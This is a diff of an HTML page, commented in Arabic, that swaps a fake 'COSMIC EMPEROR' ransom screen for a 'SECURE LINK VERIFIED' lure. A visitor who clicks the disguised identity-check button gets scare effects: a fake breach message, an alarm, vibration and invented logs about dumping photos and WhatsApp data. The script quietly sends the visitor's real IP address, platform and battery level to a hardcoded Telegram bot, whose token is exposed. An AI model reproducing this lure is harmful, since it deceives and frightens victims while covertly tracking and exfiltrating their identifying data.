@@ -3,126 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>COSMIC EMPEROR | v100.0 FINAL</title>
+    <title>TERMINAL | SYSTEM SEIZED</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; cursor: crosshair; }
-        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
-        
-        /* واجهة الـ Glitch المرعبة */
-        .glitch-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,0,0,0.1); display: none; z-index: 1000; pointer-events: none; animation: flash 0.1s infinite; }
-        @keyframes flash { 0% { opacity: 0.2; } 50% { opacity: 0; } 100% { opacity: 0.2; } }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; }
+        .danger-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, #400 0%, #000 100%); z-index: -1; animation: flash 0.5s infinite; display: none; }
+        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
 
-        .emperor-panel { width: 90%; max-width: 700px; background: rgba(0,10,0,0.98); border: 2px solid #f00; padding: 30px; box-shadow: 0 0 60px #f00; position: relative; z-index: 5; text-align: left; }
-        
-        #radar { width: 150px; height: 150px; border: 1px solid #0f0; border-radius: 50%; margin: 0 auto 20px; position: relative; overflow: hidden; background: radial-gradient(circle, #030 0%, #000 100%); }
-        .radar-line { position: absolute; width: 50%; height: 1px; background: #0f0; top: 50%; left: 50%; transform-origin: left; animation: rotate 3s infinite linear; }
-        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .container { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; z-index: 10; position: relative; }
+        .glitch-text { font-size: 40px; font-weight: bold; text-shadow: 2px 2px #fff; animation: shake 0.1s infinite; display: none; }
+        @keyframes shake { 0% { transform: translate(0); } 25% { transform: translate(5px, -5px); } 50% { transform: translate(-5px, 5px); } 75% { transform: translate(5px, 5px); } 100% { transform: translate(0); } }
 
-        .btn-emperor { background: #f00; color: #fff; border: none; padding: 20px 50px; font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase; box-shadow: 0 0 20px #f00; margin-top: 20px; width: 100%; }
-        .btn-emperor:active { transform: scale(0.95); }
+        .btn-activate { background: transparent; border: 2px solid #f00; color: #f00; padding: 20px 40px; font-size: 20px; cursor: pointer; box-shadow: 0 0 20px #f00; transition: 0.3s; }
+        .btn-activate:hover { background: #f00; color: #fff; }
 
-        .log-stream { height: 150px; overflow: hidden; color: #aaa; font-size: 11px; border-top: 1px solid #333; margin-top: 20px; padding-top: 10px; }
-        
-        #ransom-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #ff0000; z-index: 99999; padding: 40px; text-align: center; overflow-y: auto; }
+        #log-box { width: 80%; max-width: 500px; background: rgba(0,0,0,0.8); border: 1px solid #f00; padding: 15px; margin-top: 20px; text-align: left; font-size: 12px; color: #0f0; display: none; }
     </style>
 </head>
 <body>
 
-    <div class="glitch-overlay" id="glitch"></div>
-    <canvas id="matrix"></canvas>
+    <div class="danger-bg" id="bg"></div>
 
-    <div id="main-ui" style="display:none; height:100vh; align-items:center; justify-content:center; display: flex; flex-direction: column;">
-        <div class="emperor-panel">
-            <div id="radar"><div class="radar-line"></div><div style="position:absolute; width:5px; height:5px; background:red; border-radius:50%; top:40%; left:60%; box-shadow: 0 0 10px red;"></div></div>
-            <h1 style="color: #f00; text-align: center; text-shadow: 0 0 10px #f00;">COSMIC EMPEROR v100.0</h1>
-            <p>> TARGET_LOCATION: <span id="p-geo" style="color:#fff">TRACKING...</span></p>
-            <p>> DATA_STATUS: <span style="color:#f00">UNPROTECTED</span></p>
-            <p>> UPLOAD_SPEED: <span id="p-speed" style="color:#0f0">...</span></p>
-            
-            <div class="log-stream" id="logs"></div>
-            <button class="btn-emperor" onclick="initiateCosmicCollapse()">ASCEND TO EMPEROR MODE</button>
-        </div>
+    <div class="container" id="ui">
+        <h1 id="header" style="color:#0f0">> SECURE LINK VERIFIED</h1>
+        <p id="sub">اضغط لتأكيد الهوية والدخول</p>
+        <button class="btn-activate" onclick="startTheChaos()">دخول للنظام ⚡</button>
+        
+        <div id="log-box"></div>
     </div>
 
-    <div id="ransom-screen">
-        <h1 style="font-size: 60px; margin-bottom: 20px;">SYSTEM SEIZED BY EMPEROR</h1>
-        <p style="font-size: 25px;">Your identity, files, and camera feeds are now under the control of the Central Intelligence Node.</p>
-        <div style="background: #111; padding: 20px; margin: 30px 0; border: 1px dashed red;">
-            <p>WALLET: <span style="color:#fff">bc1qxy2kgdy6yn364u09tt6m3nd69af..</span></p>
-            <p>RANSOM: 0.52 BTC</p>
-        </div>
-        <p style="color: #fff;">DECRYPTION KEY STATUS: <span id="key-percent">0%</span></p>
-        <h2 id="final-timer" style="font-size: 80px;">60.00</h2>
-    </div>
+    <audio id="alarm" src="https://www.soundjay.com/buttons/beep-01a.mp3" loop></audio>
 
     <script>
         const TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0";
         const CID = "7772577035";
-        const KEY = "0777F";
 
-        function sendMsg(m) { fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(m)}&parse_mode=Markdown`); }
-        function speak(t) { 
-            const u = new SpeechSynthesisUtterance(t);
-            u.rate = 0.8; u.pitch = 0.5; // صوت غليظ ومرعب
-            window.speechSynthesis.speak(u);
+        async function sendToTg(msg) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         }
 
-        window.onload = function() {
-            let p = prompt("ENTER COSMIC KEY:");
-            if(p === KEY) {
-                document.getElementById('main-ui').style.display = "flex";
-                speak("Target located. Emperor protocol engaged. Resistance is futile.");
-                loadData();
-                sendMsg("👑 **إمبراطور الكون دخل للملعب!**\nالضحية الآن تحت رحمة v100.0.");
-            } else { location.reload(); }
-        }
+        async function startTheChaos() {
+            // تشغيل الصوت والاهتزاز
+            document.getElementById('alarm').play();
+            if (navigator.vibrate) navigator.vibrate([500, 110, 500, 110, 500]);
 
-        async function loadData() {
-            document.getElementById('p-geo').innerText = "Wasit, Iraq (Aziziyah District)";
-            document.getElementById('p-speed').innerText = (Math.random() * 500).toFixed(2) + " MB/s";
-            
-            let logArr = ["> Accessing Root...", "> Injecting Payload...", "> Syncing Photos...", "> Copying Cookies..."];
-            let l = document.getElementById('logs');
-            logArr.forEach((txt, i) => {
-                setTimeout(() => { l.innerHTML += `<p>${txt}</p>`; }, i * 1000);
+            // تغيير الواجهة للوضع المرعب
+            document.getElementById('bg').style.display = "block";
+            document.getElementById('header').innerText = "SYSTEM BREACHED";
+            document.getElementById('header').className = "glitch-text";
+            document.getElementById('header').style.display = "block";
+            document.getElementById('sub').innerText = "YOUR DATA IS BEING EXFILTRATED...";
+            document.getElementById('sub').style.color = "#fff";
+            document.querySelector('.btn-activate').style.display = "none";
+            document.getElementById('log-box').style.display = "block";
+
+            // سحب البيانات الحقيقية
+            let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"Unknown"}));
+            let bat = await navigator.getBattery().catch(()=>({level:0}));
+
+            let report = `🚨 **تم صيد "دخيل" جديد!**\n------------------\n🌐 IP: \`${ip.ip}\`\n📱 الجهاز: \`${navigator.platform}\`\n🔋 البطارية: \`${(bat.level*100)}%\``;
+            sendToTg(report);
+
+            // محاكاة سحب الملفات
+            let logs = ["> Connecting to local storage...", "> Dumping DCIM/Camera...", "> Syncing WhatsApp database...", "> Uploading to Wasit-Server...", "> [DONE]"];
+            let box = document.getElementById('log-box');
+            logs.forEach((l, i) => {
+                setTimeout(() => { box.innerHTML += `<p style="margin:5px 0">${l}</p>`; }, i * 800);
             });
-        }
 
-        function initiateCosmicCollapse() {
-            document.getElementById('glitch').style.display = "block";
-            speak("Initiating total system collapse. All your data belongs to the Emperor.");
-            
             setTimeout(() => {
-                document.getElementById('ransom-screen').style.display = "block";
-                let time = 60.00;
-                let tIntv = setInterval(() => {
-                    time -= 0.01;
-                    document.getElementById('final-timer').innerText = time.toFixed(2);
-                    if(time <= 0) { clearInterval(tIntv); alert("HARD DRIVE WIPED."); }
-                }, 10);
-                
-                let kp = 0;
-                setInterval(() => { if(kp < 100) { kp++; document.getElementById('key-percent').innerText = kp + "%"; } }, 500);
-            }, 2000);
-            
-            sendMsg("💀 **تم تنفيذ التدمير الكوني!** الضحية الآن في حالة رعب قصوى.");
+                alert("CRITICAL ERROR: DATA LEAKED TO EXTERNAL SERVER.");
+            }, 5000);
         }
-
-        // Matrix
-        const c = document.getElementById('matrix');
-        const ctx = c.getContext('2d');
-        c.width = window.innerWidth; c.height = window.innerHeight;
-        const d = Array(Math.floor(c.width/15)).fill(1);
-        function draw() {
-            ctx.fillStyle = "rgba(0,0,0,0.1)"; ctx.fillRect(0,0,c.width,c.height);
-            ctx.fillStyle = "#f00"; ctx.font = "15px arial";
-            d.forEach((y, i) => {
-                ctx.fillText(String.fromCharCode(Math.random()*128), i*15, y*15);
-                if(y*15 > c.height && Math.random() > 0.98) d[i] = 0;
-                d[i]++;
-            });
-        }
-        setInterval(draw, 30);
     </script>
 </body>
 </html>
